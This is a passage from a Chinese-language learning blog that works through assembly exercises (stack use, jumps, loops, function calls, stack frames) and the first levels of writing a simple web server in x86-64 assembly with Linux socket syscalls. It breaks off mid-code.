<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0xdeadbeef00001337</span><br><span class="line">mov [rdi], rax</span><br><span class="line"></span><br><span class="line">mov rax, 0xc0ffee0000</span><br><span class="line">mov [rsi], rax</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level18：通过偏移量访问目标内存的数据，并将数据存入对应的内存</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rax, [rdi]</span><br><span class="line">add rax, [rdi+8]</span><br><span class="line">mov [rsi], rax</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>leve19：stack（栈）。获取栈顶数据作为被减数，减法过后将数据存入栈中</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop rax #获取栈顶元素</span><br><span class="line">sub rax, rdi</span><br><span class="line">push rax #推入栈中</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level20：利用栈交换两个寄存器（rdi、rsi）存放的值</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push rdi</span><br><span class="line">push rsi</span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level21：通过栈顶指针 rsp 访问内存数据</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov rax, [rsp]</span><br><span class="line">add rax, [rsp+8]</span><br><span class="line">add rax, [rsp+16]</span><br><span class="line">add rax, [rsp+24] #将四个数据相加</span><br><span class="line">mov rsi, 4</span><br><span class="line">div rsi #获取四个数的平均值，存放在rax中</span><br><span class="line">push rax</span><br></pre></td></tr></tbody></table></figure></li>
<li><p><strong>level24</strong>：无条件转移，利用 jmp 跳转到距离当前位置
0x51 个字节的位置，同时在新位置处存放特定代码。</p>
<blockquote>
<ul>
<li><p><code>nop</code><strong>指令</strong>（1
Byte）：空操作，对程序逻辑没有任何作用，出于这个原因，它被用来填充代码。</p></li>
<li><p><code>.rept</code><strong>指令</strong>：循环执行指定的操作</p>
<p>注意：下面的这些伪指令只是告诉汇编器要生成多少个 <code>nop</code>
指令，它们本身并不会出现在最终的机器码中。生成的机器码中只包含真正的指令（如
<code>jmp</code>、<code>nop</code>、<code>pop rdi</code>、<code>mov rax, 0x403000</code>、<code>jmp rax</code>），这些指令会按照需要的字节数存储在内存中。最终的机器码中不会包含
<code>.rept</code>、<code>.endr</code> 或 <code>nop</code> 的 ASCII
表示形式。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rept times</span><br><span class="line">    code</span><br><span class="line">.endr</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
</blockquote>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">jmp next # next是代码段标签</span><br><span class="line"></span><br><span class="line">.rept 0x51</span><br><span class="line">nop</span><br><span class="line">.endr</span><br><span class="line"></span><br><span class="line">next:</span><br><span class="line">  pop rdi</span><br><span class="line">  mov rax, 0x403000</span><br><span class="line">  jmp rax #这里不能直接 jmp 0x403000</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level25：条件转移指令，注意题目中的<strong>“Assume each
dereferenced value is a signed dword（4字节即32位）.”</strong></p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, [rdi]  #题目限定了数据为32位</span><br><span class="line">cmp ebx, 0x7f454c46</span><br><span class="line">jne c2</span><br><span class="line"></span><br><span class="line">c1:</span><br><span class="line">  mov eax, [rdi+4]</span><br><span class="line">  add eax, [rdi+8]</span><br><span class="line">  add eax, [rdi+12]</span><br><span class="line">  jmp done</span><br><span class="line">c2:</span><br><span class="line">  cmp ebx, 0x00005A4D</span><br><span class="line">  jne c4</span><br><span class="line">c3:</span><br><span class="line">  mov eax, [rdi+4]</span><br><span class="line">  sub eax, [rdi+8]</span><br><span class="line">  sub eax, [rdi+12]</span><br><span class="line">  jmp done</span><br><span class="line">c4:</span><br><span class="line">  mov eax, [rdi+4]</span><br><span class="line">  imul eax, [rdi+8]</span><br><span class="line">  imul eax, [rdi+12]</span><br><span class="line">done:</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level26：switch条件判断，利用跳转表实现条件跳转</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov rax,rdi</span><br><span class="line">and rax,0xfffffffffffffffc  # 清空低2位，若 rdi 大于3，则 and 操作后 rax 的值不为0</span><br><span class="line">je next</span><br><span class="line"></span><br><span class="line">jmp [rsi + 4*8]</span><br><span class="line">next:</span><br><span class="line">  jmp [rsi + rdi*8]</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level27：for循环</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">and rax, 0</span><br><span class="line">mov rbx, 0</span><br><span class="line">L1:</span><br><span class="line">  cmp rsi, 0</span><br><span class="line">  je next</span><br><span class="line"></span><br><span class="line">L2:</span><br><span class="line">  sub rsi, 1</span><br><span class="line">  add rax, [rdi]</span><br><span class="line">  add rdi, 8</span><br><span class="line">  add rbx, 1</span><br><span class="line">  jmp L1</span><br><span class="line"></span><br><span class="line">next:</span><br><span class="line">  div rbx</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level28：while循环</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0</span><br><span class="line">cmp rdi, 0</span><br><span class="line">je L2  # 若 rdi 为0，则 rax 直接为0</span><br><span class="line">L1:</span><br><span class="line">  mov rbx, [rdi + rax]</span><br><span class="line">  cmp rbx, 0</span><br><span class="line">  je L2</span><br><span class="line">  add rax, 1</span><br><span class="line">  jmp L1</span><br><span class="line">L2:</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level29：函数调用——
call、ret。若只有一个参数，则该参数一般会被存放在 rdi 中</p>
<blockquote>
<p>函数的参数参考下表：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">Argument type</th>
<th style="text-align: center;">Registers</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">Integer/pointer arguments 1-6</td>
<td style="text-align: center;">RDI, RSI, RDX, RCX, R8, R9</td>
</tr>
<tr class="even">
<td style="text-align: center;">Floating point arguments 1-8</td>
<td style="text-align: center;">XMM0 - XMM7</td>
</tr>
<tr class="odd">
<td style="text-align: center;">Excess arguments</td>
<td style="text-align: center;">Stack</td>
</tr>
<tr class="even">
<td style="text-align: center;">Static chain pointer</td>
<td style="text-align: center;">R10</td>
</tr>
</tbody>
</table>
</blockquote>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">str_lower:</span><br><span class="line">  mov rbx, 0</span><br><span class="line">  cmp rdi, 0</span><br><span class="line">  jne L1</span><br><span class="line">  jmp done</span><br><span class="line"></span><br><span class="line">L1:</span><br><span class="line">  mov cl, [rdi]</span><br><span class="line">  cmp cl, 0  # 不能直接通过内存地址进行比较</span><br><span class="line">  jne L2</span><br><span class="line">  jmp done</span><br><span class="line"></span><br><span class="line">L2:</span><br><span class="line">  cmp cl, 0x5a</span><br><span class="line">  jbe L3  # 小于等于（无符号数）</span><br><span class="line">  add rdi, 1</span><br><span class="line">  jmp L1</span><br><span class="line"></span><br><span class="line">L3:</span><br><span class="line">  push rdi # 暂存 rdi 的值</span><br><span class="line">  mov dil, [rdi]  # 注意foo函数的参数是[rdi]，不是 rdi</span><br><span class="line">  mov rdx, 0x403000</span><br><span class="line">  call rdx  # call后不能直接加地址，需要寄存器作为中转</span><br><span class="line">  pop rdi # 回复 rdi 的值</span><br><span class="line">  mov [rdi], al</span><br><span class="line">  add rbx, 1</span><br><span class="line">  jmp L1</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">  mov rax, rbx</span><br><span class="line">  ret</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>level30：函数栈帧</p>
<p>伪代码：</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">most_common_byte(src_addr, size):</span><br><span class="line">  i = 0</span><br><span class="line">  while i &lt;= size-1:</span><br><span class="line">    curr_byte = [src_addr + i]</span><br><span class="line">    [stack_base - curr_byte] += 1</span><br><span class="line">    i += 1</span><br><span class="line"></span><br><span class="line">  b = 0</span><br><span class="line">  max_freq = 0</span><br><span class="line">  max_freq_byte = 0</span><br><span class="line">  while b &lt;= 0xff:</span><br><span class="line">    if [stack_base - b] &gt; max_freq:</span><br><span class="line">      max_freq = [stack_base - b]</span><br><span class="line">      max_freq_byte = b</span><br><span class="line">    b += 1</span><br><span class="line"></span><br><span class="line">  return max_freq_byte</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>WP：（两个参数分别是
rdi，rsi）参考https://www.freebuf.com/articles/database/321326.html</p>
<p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">push 0                      # 预留一个空位，确保栈对齐 (因为数组下标从0开始，但是栈顶有其他数据，所以需要先push)</span><br><span class="line">mov rbp, rsp                # 保存当前的栈顶指针</span><br><span class="line">mov rax, -1                 # 初始化索引为 -1</span><br><span class="line">sub rsi, 1                  # 数组大小减 1</span><br><span class="line">sub rsp, rsi                # 为数组分配栈空间</span><br><span class="line"></span><br><span class="line">loop1:</span><br><span class="line">    add rax, 1              # 索引加 1</span><br><span class="line">    cmp rax, rsi            # 比较 rax 和 rsi</span><br><span class="line">    jg next                 # 如果 rax &gt; rsi，跳转到 next</span><br><span class="line">    nop</span><br><span class="line">    mov cl, [rdi + rax]     # 取数组中的当前字节 curr_byte</span><br><span class="line">    mov r11, rbp            # 将 rbp 移动到 r11 中</span><br><span class="line">    sub r11, rcx            # 计算栈基地址减去 curr_byte 的地址</span><br><span class="line">    mov dl, [r11]           # 取该地址的值</span><br><span class="line">    add dl, 1               # 计数加 1</span><br><span class="line">    mov [r11], dl           # 存回该地址</span><br><span class="line">    jmp loop1               # 循环</span><br><span class="line">    nop</span><br><span class="line"></span><br><span class="line">next:</span><br><span class="line">mov rax, 0                  # 初始化 rax 为 0</span><br><span class="line">mov rbx, rax                # 初始化 rbx 为 0</span><br><span class="line">mov rcx, rax                # 初始化 rcx 为 0</span><br><span class="line">mov ax, -1                  # 初始化 ax 为 -1</span><br><span class="line"></span><br><span class="line">loop2:</span><br><span class="line">    add ax, 1               # b 加 1</span><br><span class="line">    cmp ax, 0xff            # 比较 b 和 0xff</span><br><span class="line">    jg return               # 如果 b &gt; 0xff，跳转到 return</span><br><span class="line">    nop</span><br><span class="line">    mov r11, rbp            # 将 rbp 移动到 r11 中</span><br><span class="line">    sub r11, rax            # 计算栈基地址减去 b 的地址</span><br><span class="line">    mov dl, [r11]           # 取该地址的值</span><br><span class="line">    cmp dl, bl              # 比较该地址的值和 max_freq</span><br><span class="line">    jle loop2               # 如果该值 &lt;= max_freq，跳转到 loop2</span><br><span class="line">    nop</span><br><span class="line">    mov bl, dl              # 否则更新 max_freq</span><br><span class="line">    mov cl, al              # 更新 max_freq_byte</span><br><span class="line">    jmp loop2               # 循环</span><br><span class="line">    nop</span><br><span class="line"></span><br><span class="line">return:</span><br><span class="line">mov rax, rcx                # 返回 max_freq_byte</span><br><span class="line">mov rsp, rbp                # 恢复栈顶指针</span><br><span class="line">pop rbx                     # 弹出预留的空位</span><br><span class="line">ret                         # 返回</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ul>
<h2 id="building-a-web-server">Building a Web Server</h2>
<h3 id="知识点-2">知识点</h3>
<ul>
<li><p>syscall（系统调用），用户通过系统调用访问内核提供的服务从而能够间接控制硬件</p>
<p>https://x64.syscall.sh/
可查看详细的系统调用函数，每个参数对应不同的<strong>寄存器</strong></p></li>
<li><p>network system call：</p>
<ul>
<li><code>int socket(int domain, int type, int protocal)</code>：socket()
creates an endpoint for communication and returns a file descriptor that
refers to that endpoint.（即该函数返回 sockfd）</li>
<li><code>int bind(int sockfd, struct sockaddr *addr, socklen_t addrlen)</code>：将地址分配给socket</li>
<li><code>int listen(int sockfd, int backlog)</code>：将对应的 socket
标记为 passive(被动)
socket，被动套接字被用于连接请求（利用accept函数）</li>
<li><code>int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)</code>：连接
socket，并创建新的 sockfd</li>
</ul></li>
<li><p><code>fork()</code>系统调用创建新的子进程，调用
<code>fork()</code>
后，会产生<strong>两个返回值</strong>，一个（子进程ID）在父进程中返回，另一个（0）在子进程中返回。下面是一个示例：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">pid_t</span> pid = fork(); <span class="comment">// 创建一个新进程</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) {</span><br><span class="line">        <span class="comment">// fork() 调用失败</span></span><br><span class="line">        perror(<span class="string">"fork failed"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) {</span><br><span class="line">        <span class="comment">// 这是子进程中执行的代码，getpid()获取是当前进程ID（即子进程ID）</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"This is the child process. PID: %d\n"</span>, getpid());</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">// 这是父进程中执行的代码，pid为子进程ID</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"This is the parent process. Parent PID: %d  Child PID: %d\n"</span>, getpid(), pid);</span><br><span class="line">        wait(<span class="literal">NULL</span>); <span class="comment">// 等待子进程结束</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>父进程和子进程共享文件描述符，但拥有独立的内存空间。若父进程通过
close 关闭了某文件，子进程不受影响</p>
</blockquote></li>
<li><p><code>close(int fd)</code>系统调用：关闭文件</p></li>
<li><p>总结：</p>
<blockquote>
<ul>
<li><p>使用 <code>socket()</code> 创建一个 TCP 套接字。</p></li>
<li><p>使用 <code>bind()</code>
将套接字绑定到指定的地址和端口。</p></li>
<li><p>使用 <code>listen()</code> 开始监听传入的连接。</p></li>
<li><p>使用 <code>accept()</code>
接受客户端连接，这会创建一个新的套接字来处理客户端通信。</p></li>
</ul>
</blockquote></li>
</ul>
<h3 id="练习-2">练习</h3>
<ul>
<li><p>level1：程序退出。</p>
<p>wp：直接运行默认给出的步骤</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60     # SYS_exit（这一步可查表 https://x64.syscall.sh/）</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level2：创建一个套接字。</p>
<p>wp：这题没给提示<span class="github-emoji"><span>😓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，参考教学视频里的代码<code>socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)</code>，但是汇编语言无法识别这些字符串，需要找到<strong>对应的整数值</strong>，这里需要阅读Linux的源码。</p>
<p><strong>Linux源码阅读网站</strong>：https://elixir.bootlin.com/linux/latest/source</p>
<p>三个参数对应的整数值如下(分别位于在三个文件中)：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// domain 用于确定协议族</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNSPEC	0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNIX		1	<span class="comment">/* Unix domain sockets 		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_LOCAL	1	<span class="comment">/* POSIX name for AF_UNIX	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_INET		2	<span class="comment">/* Internet IP Protocol 	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_AX25		3	<span class="comment">/* Amateur Radio AX.25 		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IPX		4	<span class="comment">/* Novell IPX 			*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_APPLETALK	5	<span class="comment">/* AppleTalk DDP 		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NETROM	6	<span class="comment">/* Amateur Radio NET/ROM 	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_BRIDGE	7	<span class="comment">/* Multiprotocol bridge 	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ATMPVC	8	<span class="comment">/* ATM PVCs			*/</span></span></span><br><span class="line">... </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// type</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">sock_type</span> {</span></span><br><span class="line">	SOCK_STREAM	= <span class="number">1</span>,</span><br><span class="line">	SOCK_DGRAM	= <span class="number">2</span>,</span><br><span class="line">	SOCK_RAW	= <span class="number">3</span>,</span><br><span class="line">	SOCK_RDM	= <span class="number">4</span>,</span><br><span class="line">	SOCK_SEQPACKET	= <span class="number">5</span>,</span><br><span class="line">	SOCK_DCCP	= <span class="number">6</span>,</span><br><span class="line">	SOCK_PACKET	= <span class="number">10</span>,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// protocol</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> {</span></span><br><span class="line">  IPPROTO_IP = <span class="number">0</span>,		<span class="comment">/* Dummy protocol for TCP		*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_IP		IPPROTO_IP</span></span><br><span class="line">  IPPROTO_ICMP = <span class="number">1</span>,		<span class="comment">/* Internet Control Message Protocol	*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_ICMP		IPPROTO_ICMP</span></span><br><span class="line">  IPPROTO_IGMP = <span class="number">2</span>,		<span class="comment">/* Internet Group Management Protocol	*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_IGMP		IPPROTO_IGMP</span></span><br><span class="line">  IPPROTO_IPIP = <span class="number">4</span>,		<span class="comment">/* IPIP tunnels (older KA9Q tunnels use 94) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_IPIP		IPPROTO_IPIP</span></span><br><span class="line">  IPPROTO_TCP = <span class="number">6</span>,		<span class="comment">/* Transmission Control Protocol	*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_TCP		IPPROTO_TCP</span></span><br><span class="line">  IPPROTO_UDP = <span class="number">17</span>,		<span class="comment">/* User Datagram Protocol		*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_UDP		IPPROTO_UDP</span></span><br><span class="line">... <span class="comment">// 省略了很多</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>该题的完整代码如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0     # 将 protocol 参数设置为 0，它意味着使用默认协议。对于 AF_INET 和 SOCK_STREAM 的组合，默认协议就是 TCP；或者直接明确协议，将参数设为 6</span><br><span class="line">    mov rax, 41    # socket</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 0  # 注意要退出程序</span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level3：使用
bind（<code>int bind(int sockfd, struct sockaddr *addr, socklen_t addrlen)</code>）为socket分配地址和端口。</p>
<p>wp：运行<code>/challeng/run</code>还是啥提示都没有，直接运行<code>/challenge/run ./server</code>，得到</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">===== Expected: Parent Process =====</span><br><span class="line">[ ] execve(&lt;execve_args&gt;) = 0</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, {sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr("&lt;bind_address&gt;")}, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></tbody></table></figure>
<p>发现需要绑定的端口和地址，下面分析结构体<code>sockaddr</code>和<code>sockaddr_in</code></p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> {</span></span><br><span class="line">    <span class="type">sa_family_t</span> sa_family;  <span class="comment">// address family, e.g., AF_INET, AF_INET6</span></span><br><span class="line">    <span class="type">char</span> sa_data[<span class="number">14</span>];       <span class="comment">// protocol address</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> {</span></span><br><span class="line">    <span class="type">sa_family_t</span>    sin_family;  <span class="comment">// address family: AF_INET  （2字节）</span></span><br><span class="line">    <span class="type">in_port_t</span>      sin_port;    <span class="comment">// port in network byte order  （2字节）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span 